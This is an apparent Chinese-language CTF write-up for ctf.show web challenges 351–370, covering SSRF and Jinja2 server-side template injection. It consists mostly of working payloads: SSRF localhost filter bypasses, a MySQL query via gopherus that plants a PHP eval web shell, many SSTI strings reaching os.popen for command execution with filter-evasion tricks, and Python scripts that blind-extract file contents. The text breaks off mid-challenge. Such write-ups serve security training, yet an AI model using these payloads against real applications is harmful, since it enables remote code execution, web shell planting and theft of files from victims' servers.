<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">//初始化curl会话</span><br><span class="line">$ch=curl_init($url); </span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">//// 抓取URL并把它传递给浏览器</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line"> //关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>url&#x3D;127.0.0.1&#x2F;flag.php</p>
<h3 id="web-352"><a href="#web-352" class="headerlink" title="web-352"></a>web-352</h3><p>简单的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.1/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://0x7F.0x00.0x00.0x01/flag.php        //ip地址全部转为16进制</span><br><span class="line">url=http://0x7F.0.0.1/flag.php       //也可以只转第一个</span><br><span class="line">url=http://0177.0.0.1/flag.php         //八进制</span><br><span class="line">url=http://yake-daigua@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-354"><a href="#web-354" class="headerlink" title="web-354"></a>web-354</h3><p>网络上存在一个名为<code>sudo.cc</code>的服务，放访问这个服务时，会自动重定向到<code>127.0.0.1</code></p>
<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。<br><a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p>
<h3 id="web-355"><a href="#web-355" class="headerlink" title="web-355"></a>web-355</h3><p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
<h3 id="web-356"><a href="#web-356" class="headerlink" title="web-356"></a>web-356</h3><p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
<h3 id="web-357"><a href="#web-357" class="headerlink" title="web-357"></a>web-357</h3><p>gethostbyname()函数<br>主要作用：用域名或者主机名获取地址，操作系统提供的库函数。</p>
<p>成功返回的非空指针指向如下的hostent结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct hostent</span><br><span class="line">&#123;</span><br><span class="line">      char *h_name;      //主机名</span><br><span class="line">      char **h_aliases;  //主机别名(指向到虚拟主机的域名)</span><br><span class="line">      int h_addrtype;    //主机IP地址类型</span><br><span class="line">      int h_length;      //主机IP地址长度，对于IPv4是四字节</span><br><span class="line">      char **h_addr_list; //主机IP地址列表</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#define h_addr h_addr_list[0] </span><br></pre></td></tr></table></figure>

<p><em><strong>filter_var() 函数</strong></em><br>通过指定的过滤器过滤变量。</p>
<p>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var(variable, filter, options)</span><br></pre></td></tr></table></figure>

<p>参数	描述<br>variable	必需。规定要过滤的变量。<br>filter	可选。规定要使用的过滤器的 ID。<br>options	规定包含标志&#x2F;选项的数组。检查每个过滤器可能的标志和选项。<br>PHP Filter 函数<br>PHP：指示支持该函数的最早的 PHP 版本。</p>
<p>函数	描述	PHP<br>filter_has_var()	检查是否存在指定输入类型的变量。	5<br>filter_id()	返回指定过滤器的 ID 号。	5<br>filter_input()	从脚本外部获取输入，并进行过滤。	5<br>filter_input_array()	从脚本外部获取多项输入，并进行过滤。	5<br>filter_list()	返回包含所有得到支持的过滤器的一个数组。	5<br>filter_var_array()	获取多项变量，并进行过滤。	5<br>filter_var()	获取一个变量，并进行过滤。	5<br><em><strong>PHP Filters</strong></em><br>ID 名称	描述<br>FILTER_CALLBACK	调用用户自定义函数来过滤数据。<br>FILTER_SANITIZE_STRING	去除标签，去除或编码特殊字符。<br>FILTER_SANITIZE_STRIPPED	“string” 过滤器的别名。<br>FILTER_SANITIZE_ENCODED	URL-encode 字符串，去除或编码特殊字符。<br>FILTER_SANITIZE_SPECIAL_CHARS	HTML 转义字符 ‘“&lt;&gt;&amp; 以及 ASCII 值小于 32 的字符。<br>FILTER_SANITIZE_EMAIL	删除所有字符，除了字母、数字以及 !#$%&amp;’*±&#x2F;&#x3D;?^_<code>&#123;|&#125;~@.[] FILTER_SANITIZE_URL	删除所有字符，除了字母、数字以及 $-_.+!*&#39;(),&#123;&#125;|//^~[]</code>&lt;&gt;#%”;&#x2F;?😡&amp;&#x3D;<br>FILTER_SANITIZE_NUMBER_INT	删除所有字符，除了数字和 ±<br>FILTER_SANITIZE_NUMBER_FLOAT	删除所有字符，除了数字、± 以及 .,eE。<br>FILTER_SANITIZE_MAGIC_QUOTES	应用 addslashes()。<br>FILTER_UNSAFE_RAW	不进行任何过滤，去除或编码特殊字符。<br>FILTER_VALIDATE_INT	在指定的范围以整数验证值。<br>FILTER_VALIDATE_BOOLEAN	如果是 “1”, “true”, “on” 以及 “yes”，则返回 true，如果是 “0”, “false”, “off”, “no” 以及 “”，则返回 false。否则返回 NULL。<br>FILTER_VALIDATE_FLOAT	以浮点数验证值。<br>FILTER_VALIDATE_REGEXP	根据 regexp，兼容 Perl 的正则表达式来验证值。<br>FILTER_VALIDATE_URL	把值作为 URL 来验证。<br>FILTER_VALIDATE_EMAIL	把值作为 e-mail 来验证。<br>FILTER_VALIDATE_IP	把值作为 IP 地址来验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gethostbyname — 返回主机名对应的 IPv4地址。 </span><br><span class="line">filter_var — 使用特定的过滤器过滤一个变量</span><br><span class="line">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</span><br><span class="line">FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</span><br><span class="line">所以url不能是私有地址，需要一个公网ip</span><br></pre></td></tr></table></figure>

<p>利用302跳转和dns重绑定都可以。</p>
<p>dns重绑定就用这个：dns重绑定</p>
<p>羽神提供了一种方法：使用dns重绑定</p>
<p>在网站<a target="_blank" rel="noopener" href="http://ceye.io/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%88%86%E9%85%8D%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%BB%99%E4%BD%A0%E3%80%82">http://ceye.io/注册账号，会自动分配一个域名给你。</a></p>
<p>302跳转或者DNS重绑定，自己有vps最好。</p>
<h3 id="web-358"><a href="#web-358" class="headerlink" title="web-358"></a>web-358</h3><p>正则匹配：以以<a target="_blank" rel="noopener" href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p>
<p>以show结尾比较好办，要么#show，要么?a&#x3D;show这样的都可以。</p>
<p>以<a href="http://ctf.开头的话，加一个@127.0.0.1绕过，这样parse_url解析出来的host是127.0.0.1。">http://ctf.开头的话，加一个@127.0.0.1绕过，这样parse_url解析出来的host是127.0.0.1。</a></p>
<p>考虑到ftp：<a href="ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。">ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>

<h3 id="web-359"><a href="#web-359" class="headerlink" title="web-359"></a>web-359</h3><p>gopherus打mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: root                                                                                                     </span><br><span class="line">Give query to execute: select &#x27;&lt;?php eval($_POST[pass]); ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/2.php&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>直接一把梭，记得url编码，因为是curl_exec()</p>
<h3 id="web-360"><a href="#web-360" class="headerlink" title="web-360"></a>web-360</h3><p>gopherus打redis</p>
<p>基本SSRF就是这么个事，还有很多姿势，都大差不差。</p>
<p>下面给出拓展，我总结的关于攻击PHP-FPM的文章。</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1775/">https://tttang.com/archive/1775/</a></p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">https://jinja.palletsprojects.com/en/2.11.x/templates/</a></p>
<p>下面的内容看不懂的可以自行查阅上面给出的官方解释</p>
<p>不会写脚本就是纯纯的寄。。。。。。</p>
<h3 id="web-361"><a href="#web-361" class="headerlink" title="web-361"></a>web-361</h3><p>名字就是考点！！！参数为name，测试一下注入点。</p>
<p>&#x2F;?name&#x3D;4</p>
<p>找到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，os._wrap_close类里有popen。这里直接利用popen来执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;request.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-362"><a href="#web-362" class="headerlink" title="web-362"></a>web-362</h3><p>上面的payload不管用了，这里可以用一个通用payload。原理就是找到含有<code>__builtins__</code>的类，然后利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-363"><a href="#web-363" class="headerlink" title="web-363"></a>web-363</h3><p>过滤了单双引号，可以用request对象的方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;lipsum.__globals__.__getitem__(request.args.a).popen(request.args.b).read()&#125;&#125;&amp;a=os&amp;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>当然，也可以利用chr函数来进行绕过,但chr()默认是没有的需要自己去调用定义，chr()在builtins里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">/*原payload</span><br><span class="line">name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[o+s].popen(c+a+t+ +/+f+*).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-364"><a href="#web-364" class="headerlink" title="web-364"></a>web-364</h3><p>进一步过滤了request.args，本来想用POST请求的，但是请求方式不行，转而用request.cookies</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;lipsum.__globals__.__getitem__(request.cookies.a).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">a=os;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>除此之外，也可以利用chr来进行绕过<br>payload的构造同上关即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-365"><a href="#web-365" class="headerlink" title="web-365"></a>web-365</h3><p>过滤了单双引号，还有中括号,request.cookies仍然可以用了。<br>单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过拿点绕过，拿<code>__getitem__</code>等绕过都可以。</p>
<p>使用request绕过的话可以这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;</span><br><span class="line">Cookie:c=cat /flag</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;lipsum.__globals__.__getitem__(request.cookies.a).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">a=os;b=cat /flag</span><br></pre></td></tr></table></figure>



<p>这里也尝试用一下字符串拼接，写个python脚本跑出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">payload=&quot;cat /flag&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in payload:</span><br><span class="line">    for i in range(0,1000):</span><br><span class="line">        r=requests.get(url=url%(i))</span><br><span class="line">        location=r.text.find(&quot;&lt;h3&gt;&quot;)</span><br><span class="line">        word=r.text[location+4:location+5]</span><br><span class="line">        if word==j:</span><br><span class="line">            print(&quot;config.__str__().__getitem__(%d)  ==  %s&quot;%(i,j))</span><br><span class="line">            result+=&quot;config.__str__().__getitem__(%d)~&quot;%(i)</span><br><span class="line">            break</span><br><span class="line">print(result[:len(result)-1])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)</span><br><span class="line">).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-366"><a href="#web-366" class="headerlink" title="web-366"></a>web-366</h3><p>在之前的基础上又ban了下划线_，这样__globals__这样的就构造不出来了，拿request绕过。<br>获取属性的话，用lipsum.(request.values.b)是会500的，中括号被ban了，__getattribute__也用不了的话，就用falsk自带的过滤器attr：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload:?name=&#123;&#123;((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">带上Cookie:a=os;b=cat /flag;c=__globals__;d=__getitem__</span><br></pre></td></tr></table></figure>

<h3 id="web-367"><a href="#web-367" class="headerlink" title="web-367"></a>web-367</h3><p>还禁用了os</p>
<p>上面的第二个payload依旧可以用</p>
<p>把os写到request里面就行了，只要不ban掉request的话，还是比较轻松的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-368"><a href="#web-368" class="headerlink" title="web-368"></a>web-368</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#123;&#123;和&#125;&#125;，使用&#123;%%&#125;绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=__globals__&amp;b=cat /flag&amp;c=os&amp;name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.c).popen(request.values.b).read()%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload:?name=&#123;% print(((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read())%&#125;</span><br><span class="line"></span><br><span class="line">带上Cookie:a=os;b=cat /flag;c=__globals__;d=__getitem__</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当然了，一般的话把&#123;&#123;给ban了，用&#123;% %&#125;是可以盲注的，我们这里盲注一下/flag文件的内容，原理就在于open(&#x27;/flag&#x27;).read()是回显整个文件，但是read函数里加上参数：open(&#x27;/flag&#x27;).read(1)，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了，写个python脚本：</span><br></pre></td></tr></table></figure>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
<p>feng师傅的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;:</span><br><span class="line">        params=&#123;</span><br><span class="line">            &#x27;name&#x27;:&quot;&#123;&#123;% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) %&#125;&#125;&#123;&#123;% if a==request.values.d %&#125;&#125;feng&#123;&#123;% endif %&#125;&#125;&quot;.format(i),</span><br><span class="line">            &#x27;a&#x27;:&#x27;__globals__&#x27;,</span><br><span class="line">            &#x27;b&#x27;:&#x27;__builtins__&#x27;,</span><br><span class="line">            &#x27;c&#x27;:&#x27;/flag&#x27;,</span><br><span class="line">            &#x27;d&#x27;:f&#x27;&#123;flag+j&#125;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.get(url=url,params=params)</span><br><span class="line">        if &quot;feng&quot; in r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            if j==&quot;&#125;&quot;:</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>注意我name那里用了<code>&#123;&#123;和&#125;&#125;</code>，这是因为我用的format格式化字符串，用<code>&#123;&#125;</code>来占位，如果里面本来就有<code>&#123;</code>和<code>&#125;</code>的话，就需要用<code>&#123;&#123;`和`&#125;&#125;</code>来代替<code>&#123;</code>和<code>&#125;</code>。</p>
<p>下面是yu22x师傅的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url =&#x27;http://85302b44-c999-432c-8891-7ebdf703d6c0.chall.ctf.show/?name=&#123;%set aaa=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)%&#125;&#123;%if aaa.eval(request.cookies.x5)==request.cookies.x6%&#125;1341&#123;%endif%&#125;&#x27;</span><br><span class="line">s=string.digits+string.ascii_lowercase+&quot;&#123;-&#125;&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,43):</span><br><span class="line">	print(i)</span><br><span class="line">	for j in s:</span><br><span class="line">		x=flag+j</span><br><span class="line">		headers=&#123;&#x27;Cookie&#x27;:&#x27;&#x27;&#x27;x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=open(&#x27;/flag&#x27;).read(&#123;0&#125;);x6=&#123;1&#125;&#x27;&#x27;&#x27;.format(i,x)&#125;</span><br><span class="line">		r=requests.get(url,headers=headers)</span><br><span class="line">		#print(r.text)</span><br><span class="line">		if(&quot;1341&quot; in r.text):</span><br><span class="line">			flag=x</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>

<h3 id="web-369"><a href="#web-369" class="headerlink" title="web-369"></a>web-369</h3><p>把request给ban了，需要自己凑字符了，这里拿config来凑。一般我们想到的是使用__str__()，但是一个问题是_被ban了，所以__str__()用不了；这里拿string过滤器来得到config的字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_和[ ]被ban了，所以获取字符串中的某个字符比较困难。这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符，参考feng师傅的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;</span><br><span class="line"> </span><br><span class="line">payload=&quot;cat /flag&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in payload:</span><br><span class="line">    for i in range(0,1000):</span><br><span class="line">        r=requests.get(url=url.format(i))</span><br><span class="line">        location=r.text.find(&quot;&lt;h3&gt;&quot;)</span><br><span class="line">        word=r.text[location+4:location+5]</span><br><span class="line">        if word==j.lower():</span><br><span class="line">            print(&quot;(config|string|list).pop(%d).lower()  ==  %s&quot;%(i,j))</span><br><span class="line">            result+=&quot;(config|string|list).pop(%d).lower()~&quot;%(i)</span><br><span class="line">            break</span><br><span class="line">print(result[:len(result)-1])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?name=&#123;% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span><br><span class="line">)).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %&#125;</span><br></pre></td></tr></table></figure>

<p>yu22x师傅的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET:?name=</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure>

<p>原理自己看吧：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<h3 id="web-370"><a href="#web-370" class="headerlink" title="web-370"></a>web-370</h3><p>又ban了数字，想了一下可以把一些东西转string再转list，然后用index，然后基本上所有数字都可以拿到，但是可能稍微麻烦了一下。这里我想办法拿到下划线和斜杠，然后组合：</p>
